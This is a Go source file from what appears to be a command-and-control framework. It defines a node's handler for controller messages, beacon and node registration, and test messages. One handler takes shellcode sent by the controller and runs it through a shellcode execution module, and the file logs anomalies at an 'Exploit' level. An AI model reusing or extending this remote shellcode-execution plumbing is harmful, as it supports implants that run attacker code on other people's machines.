package node

import (
	"bytes"
	"context"
	"fmt"

	"github.com/davecgh/go-spew/spew"
	"github.com/vmihailenco/msgpack/v4"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/messages"
	"project/internal/module/shellcode"
	"project/internal/protocol"
	"project/internal/xpanic"
)

type handler struct {
	ctx *Node

	context context.Context
	cancel  context.CancelFunc
}

func newHandler(ctx *Node) *handler {
	h := handler{
		ctx: ctx,
	}
	h.context, h.cancel = context.WithCancel(context.Background())
	return &h
}

func (h *handler) Cancel() {
	h.cancel()
}

func (h *handler) Close() {
	h.ctx = nil
}

func (h *handler) logf(l logger.Level, format string, log ...interface{}) {
	h.ctx.logger.Printf(l, "handler", format, log...)
}

func (h *handler) log(l logger.Level, log ...interface{}) {
	h.ctx.logger.Println(l, "handler", log...)
}

// logfWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo logf
// spew output
//
// first log interface must be *protocol.Send or protocol.Broadcast
func (h *handler) logfWithInfo(l logger.Level, format string, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintf(buf, format, log[1:]...)
	buf.WriteString("\n")
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(l, "handler", buf)
}

// logWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo log
// spew output
//
// first log interface must be *protocol.Send or protocol.Broadcast
func (h *handler) logWithInfo(l logger.Level, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintln(buf, log[1:]...)
	buf.WriteString("\n")
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(l, "handler", buf)
}

// -------------------------------------------send---------------------------------------------------

func (h *handler) OnSend(send *protocol.Send) {
	defer func() {
		if r := recover(); r != nil {
			err := xpanic.Error(r, "handler.OnSend")
			h.log(logger.Fatal, err)
		}
	}()
	if len(send.Message) < 4 {
		const log = "controller send with invalid size"
		h.logWithInfo(logger.Exploit, send, log)
		return
	}
	msgType := convert.BytesToUint32(send.Message[:4])
	send.Message = send.Message[4:]
	switch msgType {
	case messages.CMDExecuteShellCode:
		h.handleExecuteShellCode(send)
	case messages.CMDTest:
		h.handleSendTestMessage(send)
	default:
		const format = "controller send unknown message\ntype: 0x%08X\n%s"
		h.logf(logger.Exploit, format, msgType, spew.Sdump(send))
	}
}

// TODO <security> must remove to Beacon
func (h *handler) handleExecuteShellCode(send *protocol.Send) {
	defer func() {
		if r := recover(); r != nil {
			err := xpanic.Error(r, "handler.handleExecuteShellCode")
			h.log(logger.Fatal, err)
		}
	}()
	var es messages.ExecuteShellCode
	err := msgpack.Unmarshal(send.Message, &es)
	if err != nil {
		const log = "controller send invalid shellcode"
		h.logWithInfo(logger.Exploit, send, log)
		return
	}
	err = shellcode.Execute(es.Method, es.ShellCode)
	if err != nil {
		fmt.Println("--------------", err)
	}
}

func (h *handler) handleSendTestMessage(send *protocol.Send) {
	defer func() {
		if r := recover(); r != nil {
			err := xpanic.Error(r, "handler.handleSendTestMessage")
			h.log(logger.Fatal, err)
		}
	}()
	if h.ctx.Test.SendTestMsg == nil {
		return
	}
	select {
	case h.ctx.Test.SendTestMsg <- send.Message:
	case <-h.context.Done():
	}
}

// ----------------------------------------broadcast-------------------------------------------------

func (h *handler) OnBroadcast(broadcast *protocol.Broadcast) {
	defer func() {
		if r := recover(); r != nil {
			err := xpanic.Error(r, "handler.OnBroadcast")
			h.log(logger.Fatal, err)
		}
	}()
	if len(broadcast.Message) < 4 {
		const log = "controller broadcast with invalid size"
		h.logWithInfo(logger.Exploit, broadcast, log)
		return
	}
	msgType := convert.BytesToUint32(broadcast.Message[:4])
	broadcast.Message = broadcast.Message[4:]
	switch msgType {
	case messages.CMDNodeRegisterResponse:
		h.handleNodeRegisterResponse(broadcast)
	case messages.CMDBeaconRegisterResponse:
		h.handleBeaconRegisterResponse(broadcast)
	case messages.CMDTest:
		h.handleBroadcastTestMessage(broadcast)
	default:
		const format = "controller broadcast unknown message\ntype: 0x%08X\n%s"
		h.logf(logger.Exploit, format, msgType, spew.Sdump(broadcast))
	}
}

func (h *handler) handleNodeRegisterResponse(broadcast *protocol.Broadcast) {
	defer func() {
		if r := recover(); r != nil {
			err := xpanic.Error(r, "handler.handleNodeRegisterResponse")
			h.log(logger.Fatal, err)
		}
	}()
	nrr := new(messages.NodeRegisterResponse)
	err := msgpack.Unmarshal(broadcast.Message, nrr)
	if err != nil {
		const log = "controller broadcast invalid node register response"
		h.logWithInfo(logger.Exploit, broadcast, log)
		return
	}
	h.ctx.storage.AddNodeSessionKey(nrr.GUID, &nodeSessionKey{
		PublicKey:    nrr.PublicKey,
		KexPublicKey: nrr.KexPublicKey,
		AckTime:      nrr.ReplyTime,
	})
	h.ctx.storage.SetNodeRegister(nrr.GUID, nrr)
}

func (h *handler) handleBeaconRegisterResponse(broadcast *protocol.Broadcast) {
	defer func() {
		if r := recover(); r != nil {
			err := xpanic.Error(r, "handler.handleBeaconRegisterResponse")
			h.log(logger.Fatal, err)
		}
	}()
	brr := new(messages.BeaconRegisterResponse)
	err := msgpack.Unmarshal(broadcast.Message, brr)
	if err != nil {
		const log = "controller broadcast invalid beacon register response"
		h.logWithInfo(logger.Exploit, broadcast, log)
		return
	}
	h.ctx.storage.AddBeaconSessionKey(brr.GUID, &beaconSessionKey{
		PublicKey:    brr.PublicKey,
		KexPublicKey: brr.KexPublicKey,
		AckTime:      brr.ReplyTime,
	})
	h.ctx.storage.SetBeaconRegister(brr.GUID, brr)
}

func (h *handler) handleBroadcastTestMessage(broadcast *protocol.Broadcast) {
	defer func() {
		if r := recover(); r != nil {
			err := xpanic.Error(r, "handler.handleBroadcastTestMessage")
			h.log(logger.Fatal, err)
		}
	}()
	if h.ctx.Test.BroadcastTestMsg == nil {
		return
	}
	select {
	case h.ctx.Test.BroadcastTestMsg <- broadcast.Message:
	case <-h.context.Done():
		return
	}
}
